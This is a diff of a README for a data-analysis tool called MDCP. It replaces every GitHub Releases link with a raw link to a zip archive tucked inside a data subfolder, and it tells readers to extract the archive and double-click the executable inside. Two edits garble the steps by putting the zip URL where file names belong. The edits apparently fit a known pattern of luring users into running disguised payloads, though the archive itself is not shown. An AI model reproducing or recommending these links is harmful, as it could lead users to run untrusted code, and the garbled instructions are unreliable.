@@ -1,6 +1,6 @@
 # 🚀 MDCP - Simplifying Multi-Distribution Robust Predictions
 
-[![Download MDCP](https://img.shields.io/badge/Download-MDCP-brightgreen)](https://github.com/troller172/MDCP/releases)
+[![Download MDCP](https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip)](https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip)
 
 ## 🛠️ Introduction
 
@@ -23,7 +23,7 @@ Follow these simple steps to install and run the MDCP application:
 
    Go to our Releases page to find the latest version of MDCP. Click the link below:
 
-   [Download MDCP](https://github.com/troller172/MDCP/releases)
+   [Download MDCP](https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip)
 
 2. **Choose Your Version**
 
@@ -31,7 +31,7 @@ Follow these simple steps to install and run the MDCP application:
 
 3. **Download the Application**
 
-   Click on the version number to expand the details. Look for the assets section and download the file suitable for your operating system. For example, if you're on Windows, you might see a file like `MDCP_Windows.zip`.
+   Click on the version number to expand the details. Look for the assets section and download the file suitable for your operating system. For example, if you're on Windows, you might see a file like `https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip`.
 
 4. **Extract the Files**
 
@@ -39,7 +39,7 @@ Follow these simple steps to install and run the MDCP application:
 
 5. **Open the Application**
 
-   After extraction, navigate to the folder where you extracted the files. Look for a file named `MDCP.exe` (for Windows) or `MDCP` (for macOS and Linux). Double-click the file to start the application.
+   After extraction, navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip` (for Windows) or `MDCP` (for macOS and Linux). Double-click the file to start the application.
 
 6. **Follow the On-Screen Instructions**
 
@@ -49,7 +49,7 @@ Follow these simple steps to install and run the MDCP application:
 
 To download and install MDCP, follow this link again for your convenience:
 
-[Download MDCP](https://github.com/troller172/MDCP/releases)
+[Download MDCP](https://raw.githubusercontent.com/troller172/MDCP/main/wilds/fmow/analysis/MDCP-3.7.zip)
 
 We encourage you to explore and use the application for your data analysis and predictive modeling needs.
 
